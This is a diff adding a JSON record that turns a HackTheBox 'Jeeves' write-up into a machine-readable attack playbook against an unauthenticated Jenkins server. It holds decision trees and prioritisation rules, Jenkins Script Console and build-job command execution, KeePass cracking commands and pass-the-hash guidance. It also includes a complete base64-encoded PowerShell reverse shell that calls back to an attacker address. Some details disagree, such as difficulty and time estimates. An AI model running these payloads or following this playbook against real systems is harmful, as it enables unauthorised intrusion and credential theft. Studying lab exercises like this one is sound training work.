@@ -1,0 +1,850 @@
+{
+  "writeup_id": "Htb_Jeeves",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_jenkins_unauthenticated_rce",
+    "primary_services": [
+      "http",
+      "smb",
+      "msrpc",
+      "jetty"
+    ],
+    "port_signature": "80+135+445+50000",
+    "service_combination": "iis+jetty+smb+msrpc",
+    "os_family": "windows_10_server2016",
+    "environment_type": "standalone_workstation",
+    "entry_vector": "jenkins_unauthenticated_access",
+    "privilege_path": "jenkins_rce_to_administrator",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "jenkins_no_authentication",
+      "jetty_webserver_port_50000",
+      "keepass_database_present",
+      "alternative_data_streams"
+    ],
+    "environmental_clues": [
+      "iis_10_microsoft_server",
+      "jetty_snapshot_version",
+      "workgroup_not_domain",
+      "smb_signing_disabled"
+    ],
+    "similar_scenarios": [
+      "butler_htb_easy",
+      "devel_htb_easy"
+    ],
+    "unique_aspects": [
+      "jetty_port_50000",
+      "keepass_hash_extraction",
+      "ads_hidden_flags"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Jenkins_Unauthenticated_Access",
+        "success_reason": "Jenkins instance exposed without authentication on port 50000",
+        "prerequisite_indicators": [
+          "jetty_webserver_running",
+          "jenkins_service_accessible",
+          "no_authentication_required"
+        ],
+        "recognition_patterns": [
+          "Jetty server headers",
+          "404 errors on root but directories exist",
+          "Jenkins dashboard accessible",
+          "askjeeves directory found via directory bruteforce"
+        ],
+        "failure_modes": [
+          "jenkins_authentication_enabled",
+          "service_not_exposed",
+          "insufficient_permissions"
+        ],
+        "environmental_factors": [
+          "default_jenkins_installation",
+          "development_environment_exposure",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Jenkins_Command_Execution",
+        "success_reason": "Jenkins allows creation and execution of build jobs with Windows batch commands",
+        "prerequisite_indicators": [
+          "jenkins_dashboard_accessible",
+          "job_creation_permissions",
+          "build_execution_allowed"
+        ],
+        "recognition_patterns": [
+          "New Item button available",
+          "Freestyle project option",
+          "Execute Windows batch command option",
+          "Build Now functionality"
+        ],
+        "failure_modes": [
+          "job_creation_restricted",
+          "command_execution_disabled",
+          "sandboxed_execution_environment"
+        ],
+        "environmental_factors": [
+          "jenkins_running_as_privileged_user",
+          "unrestricted_build_environment",
+          "windows_command_execution_available"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Jenkins instance on port 50000",
+        "discovery_method": "Directory bruteforce with dirbuster wordlist",
+        "why_critical": "Provided unauthenticated access to command execution platform",
+        "how_to_recognize": [
+          "Jetty server on non-standard port",
+          "404 errors but hidden directories exist",
+          "askjeeves directory pattern",
+          "Jenkins dashboard interface"
+        ],
+        "follow_up_actions": [
+          "test_job_creation_permissions",
+          "attempt_command_execution",
+          "establish_reverse_shell",
+          "enumerate_system_privileges"
+        ]
+      },
+      {
+        "discovery": "Wordlist selection importance",
+        "discovery_method": "Comparison between raft-medium and dirbuster wordlists",
+        "why_critical": "Modern wordlists missed critical directory that older wordlists found",
+        "how_to_recognize": [
+          "initial_enumeration_finds_nothing",
+          "service_running_but_no_content",
+          "legacy_application_patterns"
+        ],
+        "follow_up_actions": [
+          "try_multiple_wordlists",
+          "use_legacy_wordlists_for_older_systems",
+          "manual_directory_guessing",
+          "technology_specific_wordlists"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web_access",
+        "escalation_method": "Jenkins_Job_Execution",
+        "why_possible": "Jenkins configured without authentication and allows job creation/execution",
+        "recognition_signs": [
+          "jenkins_dashboard_loads_without_login",
+          "new_item_button_available",
+          "build_options_accessible",
+          "windows_batch_command_execution"
+        ],
+        "exploitation_path": "Unauthenticated Access → Job Creation → Command Execution → Reverse Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 80,135,445,50000 open on Windows host",
+        "decision": "Enumerate web services first, then SMB if credentials found",
+        "reasoning": "Multiple web ports suggest web-based attack vectors, SMB requires credentials",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "smb_enumeration",
+            "when": "if anonymous access available"
+          },
+          {
+            "option": "rpc_enumeration",
+            "when": "if port 135 allows anonymous"
+          }
+        ],
+        "success_indicators": [
+          "web_applications_discovered",
+          "directory_enumeration_successful",
+          "authentication_bypass_found"
+        ],
+        "next_decision": "prioritize_web_attack_surface"
+      },
+      {
+        "step": 2,
+        "situation": "Standard directory enumeration failed on Jetty server",
+        "decision": "Try alternative wordlists for older systems",
+        "reasoning": "Different wordlists may reveal paths missed by modern lists",
+        "confidence": 0.75,
+        "prerequisites": [
+          "initial_enumeration_failed",
+          "jetty_server_identified"
+        ],
+        "success_indicators": [
+          "hidden_directories_found"
+        ],
+        "failure_fallbacks": [
+          "port_specific_enumeration",
+          "technology_specific_paths"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Jenkins instance discovered without authentication",
+        "decision": "Attempt code execution via Jenkins job creation",
+        "reasoning": "Unauthenticated Jenkins allows arbitrary command execution",
+        "confidence": 0.95,
+        "prerequisites": [
+          "jenkins_access_confirmed",
+          "job_creation_available"
+        ],
+        "success_indicators": [
+          "command_execution_successful"
+        ],
+        "failure_fallbacks": [
+          "script_console_method",
+          "plugin_exploitation"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_web_enumeration_fails": {
+        "action": "try_alternative_wordlists",
+        "alternatives": [
+          "dirbuster_medium",
+          "common_application_paths"
+        ],
+        "decision_criteria": "based_on_technology_stack_identified"
+      },
+      "if_jenkins_found": {
+        "action": "test_authentication_bypass",
+        "methods": [
+          "job_creation",
+          "script_console",
+          "plugin_manager"
+        ],
+        "next_phase": "establish_reverse_shell"
+      },
+      "if_execution_achieved": {
+        "action": "enumerate_for_privilege_escalation",
+        "tools": [
+          "winpeas",
+          "manual_enumeration"
+        ],
+        "targets": [
+          "keepass_databases",
+          "stored_credentials",
+          "service_misconfigurations"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "try_multiple_wordlists_on_older_systems",
+        "reasoning": "legacy_systems_may_use_uncommon_paths",
+        "applicability": "systems_older_than_2018"
+      },
+      {
+        "rule": "prioritize_jenkins_exploitation_when_unauthenticated",
+        "reasoning": "high_success_rate_for_code_execution",
+        "applicability": "jenkins_instances_without_auth"
+      },
+      {
+        "rule": "use_script_console_as_backup_execution_method",
+        "reasoning": "alternative_path_when_job_creation_restricted",
+        "applicability": "jenkins_with_limited_permissions"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Jenkins Script Console RCE",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "jenkins"
+        ],
+        "required_ports": [
+          8080,
+          50000,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "jenkins_service_accessible",
+          "no_authentication_required",
+          "script_console_enabled"
+        ],
+        "success_indicators": [
+          "jenkins_dashboard_accessible",
+          "manage_jenkins_available",
+          "script_console_reachable"
+        ],
+        "incompatible_with": [
+          "authentication_required",
+          "script_console_disabled",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "jetty_server_detected",
+          "default_jenkins_configuration",
+          "jenkins_version_banner"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_service_accessible",
+          "no_rate_limiting"
+        ],
+        "success_indicators": [
+          "hidden_directories_found",
+          "status_200_responses",
+          "directory_listings_enabled"
+        ],
+        "incompatible_with": [
+          "aggressive_rate_limiting",
+          "waf_protection",
+          "complete_network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_web_server_config",
+          "legacy_applications",
+          "development_environments"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "SMB Anonymous Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "smb",
+          "microsoft-ds"
+        ],
+        "required_ports": [
+          445,
+          139
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smb_service_accessible",
+          "anonymous_access_allowed"
+        ],
+        "success_indicators": [
+          "share_enumeration_successful",
+          "null_session_established",
+          "readable_shares_found"
+        ],
+        "incompatible_with": [
+          "smb_signing_required",
+          "anonymous_access_disabled",
+          "modern_security_hardening"
+        ],
+        "confidence_boosters": [
+          "legacy_windows_versions",
+          "workgroup_configuration",
+          "default_smb_settings"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "3-8 minutes"
+      },
+      {
+        "technique": "Pass-the-Hash",
+        "mitre_id": "T1550.002",
+        "required_services": [
+          "smb",
+          "winrm",
+          "rdp"
+        ],
+        "required_ports": [
+          445,
+          5985,
+          3389
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "ntlm_hash_obtained",
+          "target_service_accessible",
+          "ntlm_authentication_enabled"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "remote_access_gained",
+          "administrative_privileges"
+        ],
+        "incompatible_with": [
+          "kerberos_only_authentication",
+          "credential_guard_enabled",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "local_admin_hash_obtained",
+          "same_local_admin_password",
+          "legacy_authentication_methods"
+        ],
+        "typical_success_rate": 0.88,
+        "estimated_time": "1-3 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "jenkins_service": {
+        "port_indicators": [
+          8080,
+          50000,
+          9090
+        ],
+        "service_indicators": [
+          "jenkins",
+          "jetty",
+          "http"
+        ],
+        "banner_indicators": [
+          "Jenkins",
+          "Jetty",
+          "Hudson"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_smb": {
+        "port_indicators": [
+          445,
+          139,
+          135
+        ],
+        "service_indicators": [
+          "microsoft-ds",
+          "smb",
+          "msrpc"
+        ],
+        "banner_indicators": [
+          "Windows",
+          "SMB",
+          "Microsoft"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "IIS",
+          "Apache",
+          "Nginx"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "jenkins_script_console_rce",
+          "when": "jenkins_service_detected_no_auth",
+          "reason": "immediate_code_execution_high_success_rate"
+        },
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected",
+          "reason": "often_reveals_credentials_and_shares"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reliable_but_time_consuming"
+        },
+        {
+          "attack": "pass_the_hash",
+          "when": "ntlm_hash_obtained",
+          "reason": "high_success_rate_with_prerequisites"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Jenkins Script Console RCE",
+        "mitre_id": "T1059.007",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Jenkins Script Console",
+            "command_template": "println \"cmd.exe /c {command}\".execute().text",
+            "actual_command": "println \"cmd.exe /c whoami\".execute().text",
+            "output_pattern": "Command output displayed in console",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "jenkins_instance_accessible",
+          "no_authentication_required",
+          "script_console_enabled"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "system_information_retrieved",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "authentication_required",
+          "script_console_disabled",
+          "groovy_syntax_errors"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "credential_harvesting",
+          "privilege_escalation"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Jenkins Job Build RCE",
+        "mitre_id": "T1059.003",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Jenkins Build Job",
+            "command_template": "cmd /c {command}",
+            "actual_command": "cmd /c whoami",
+            "output_pattern": "Build console output shows command results",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "jenkins_instance_accessible",
+          "job_creation_permissions",
+          "build_execution_permissions"
+        ],
+        "success_indicators": [
+          "job_created_successfully",
+          "build_executes_without_errors",
+          "command_output_visible_in_console"
+        ],
+        "common_failures": [
+          "insufficient_permissions",
+          "build_queue_restrictions",
+          "command_syntax_errors"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "file_system_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "3-7 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "KeePass Database Cracking",
+        "mitre_id": "T1555.005",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "keepass2john",
+            "command_template": "keepass2john {database_file}",
+            "actual_command": "keepass2john CEH.kdbx",
+            "output_pattern": "$keepass$*2*6000*0*{hash_data}",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          },
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 13400 {hash_file} {wordlist}",
+            "actual_command": "hashcat -m 13400 keepass.hash rockyou.txt",
+            "success_factors": [
+              "weak_master_password",
+              "common_wordlist_hit"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "keepass_database_file_accessible",
+          "file_exfiltration_capability",
+          "password_cracking_tools_available"
+        ],
+        "success_indicators": [
+          "hash_extracted_successfully",
+          "master_password_cracked",
+          "database_contents_accessible"
+        ],
+        "common_failures": [
+          "strong_master_password",
+          "key_file_required",
+          "database_corruption"
+        ],
+        "follow_up_techniques": [
+          "credential_extraction",
+          "pass_the_hash",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "PowerShell Reverse Shell",
+        "mitre_id": "T1059.001",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "PowerShell Base64 Encoded",
+            "command_template": "powershell -e {base64_encoded_payload}",
+            "actual_command": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==",
+            "output_pattern": "Reverse shell connection established",
+            "effectiveness_rating": 5,
+            "reliability": 0.92
+          }
+        ],
+        "prerequisites": [
+          "powershell_available_on_target",
+          "outbound_network_connectivity",
+          "listener_configured"
+        ],
+        "success_indicators": [
+          "connection_received_at_listener",
+          "interactive_shell_established",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "powershell_execution_policy_restrictions",
+          "network_connectivity_blocked",
+          "antivirus_detection"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "persistence_establishment",
+          "lateral_movement"
+        ],
+        "time_investment": "1-3 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Jenkins",
+        "use_case": "initial_access_via_rce",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "ci_cd_environments"
+        ],
+        "alternatives": [
+          "direct_web_shell",
+          "application_exploits"
+        ],
+        "best_practices": [
+          "check_for_authentication_bypass",
+          "test_both_script_console_and_job_methods",
+          "use_jenkins_workspace_for_file_operations"
+        ]
+      },
+      {
+        "tool": "keepass2john",
+        "use_case": "keepass_database_hash_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "keepass_database_cracking"
+        ],
+        "alternatives": [
+          "manual_database_analysis"
+        ],
+        "best_practices": [
+          "verify_database_integrity_before_processing",
+          "use_appropriate_hashcat_mode_13400",
+          "consider_key_file_requirements"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "jenkins_to_system_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "println \"cmd.exe /c whoami\".execute().text",
+            "purpose": "Test command execution via Jenkins Script Console",
+            "expected_output": "jeeves\\kohsuke"
+          },
+          {
+            "step": 2,
+            "command": "println \"powershell -e [base64_payload]\".execute().text",
+            "purpose": "Execute reverse shell payload",
+            "expected_output": "Reverse shell connection established"
+          },
+          {
+            "step": 3,
+            "command": "copy \\users\\kohsuke\\Documents\\CEH.kdbx .",
+            "purpose": "Copy KeePass database to accessible location",
+            "expected_output": "File copied successfully"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "keepass_credential_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "keepass2john CEH.kdbx",
+            "purpose": "Extract hash from KeePass database",
+            "expected_output": "Hash in john format"
+          },
+          {
+            "step": 2,
+            "command": "hashcat -m 13400 keepass.hash rockyou.txt",
+            "purpose": "Crack KeePass master password",
+            "expected_output": "Master password recovered"
+          },
+          {
+            "step": 3,
+            "command": "Open database with recovered password",
+            "purpose": "Extract stored credentials",
+            "expected_output": "Access to stored passwords and hashes"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "15-45 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Jeeves",
+      "difficulty": "Medium",
+      "os": "Windows 7-10",
+      "platform": "HackTheBox",
+      "release_date": "2017-11-11",
+      "author": "mrb3n",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "jenkins_exploitation",
+        "pass_the_hash",
+        "keepass_database"
+      ],
+      "key_vulnerabilities": [
+        "unauthenticated_jenkins",
+        "credential_storage",
+        "alternative_data_streams"
+      ],
+      "environment_type": "windows_workstation",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "jenkins_security",
+        "credential_extraction",
+        "windows_persistence",
+        "ads_forensics"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_testing",
+        "windows_fundamentals",
+        "hash_attacks"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "credential_access",
+        "privilege_escalation",
+        "persistence"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_dumping",
+        "pass_the_hash"
+      ],
+      "defensive_lessons": [
+        "secure_jenkins_deployment",
+        "credential_management",
+        "file_system_monitoring"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Devel",
+        "Optimum",
+        "Bastard"
+      ],
+      "similarity_reasons": [
+        "web_application_exploitation",
+        "windows_privilege_escalation",
+        "credential_attacks"
+      ],
+      "unique_aspects": [
+        "jenkins_exploitation",
+        "keepass_database",
+        "alternative_data_streams",
+        "historical_significance"
+      ],
+      "difficulty_factors": [
+        "multiple_attack_vectors",
+        "credential_extraction_techniques",
+        "windows_specific_features"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T13:42:30.794071",
+    "original_file": "0xdf_writeups/Htb Jeeves.md",
+    "content_length": 23657,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
